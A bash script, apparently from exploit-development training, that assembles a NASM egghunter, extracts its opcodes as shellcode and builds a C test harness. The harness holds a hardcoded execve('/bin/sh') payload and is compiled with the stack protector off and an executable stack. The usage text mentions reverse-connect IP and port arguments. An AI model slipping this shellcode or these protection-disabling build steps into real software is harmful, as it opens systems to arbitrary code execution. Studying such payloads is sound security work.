#!/bin/bash

### Helper functions
extended_usage() {
	usage
	echo "[FILE] is the program to compile, but without the file extension (.nasm)."
	echo "[IP] is the ip address to connect back to."
	echo "[PORT] is the port to used to connect (back) to."
}

usage(){
	echo "Usage: $0 [FILE] ([IP]) [PORT]"
	echo ""
}	
### 

# If the user asks for help or tries to run the script without arguments..
if [[ "$1" == "--help" ]] || [ "$#" -eq 0 ]; then
	extended_usage
	exit -1
fi

# Make sure that the file exists
if [ ! -f $1.nasm ]; then
	echo "[!!!] File '$1.nasm' not found"
	exit -1
fi


####
# Compile input file to object file
echo "[***] Compiling with nasm..."
nasm -f elf32 -o $1.o $1.nasm

# Link object file
echo "[***] Linking with ld..." 
echo ""
ld -m elf_i386 -o $1 $1.o
 
# Remove the object file
rm $1.o

# List the opcode
#echo "[***] Listing opcode"
#objdump -d $1 -M intel


# Extract shellcode

shellcode=$(for i in $(objdump -d $1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;)

echo ""
echo "[***] Extracted shellcode:"
echo $shellcode
#echo ""
#echo "[***] Generating shellcode-test compiler..."

cat > egg-$1.c << EOF
//
#include <stdio.h>
#include <string.h>

#define EGG "\x90\x50\x90\x50"
unsigned char egg[] = EGG;
unsigned char *egghunter = "$shellcode"; 

//# The shellcode to search for (in this case 'execve("/bin/sh")'')
unsigned char *shellcode = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
	char buffer[200];

	strcpy(buffer, egg);	
	strcpy(buffer+4, egg);	
	strcpy(buffer+8, shellcode);	

	printf("Egghunter length: %d\n", strlen(egghunter));
	printf("Stack location  %p\n", buffer);
	int (*ret)() = (int(*)())egghunter;
	ret();
}

EOF

echo ""
echo "Compiling 'shellcode-$1.c'..."
gcc -m32 -fno-stack-protector -z  execstack egg-$1.c -o egg-$1
echo ""

# Delete unneeded files...
echo "Deleting files.."
rm egg-$1.c
rm $1

echo ""
echo "[*** DONE ***]"
echo "Now try executing './egg-$1'"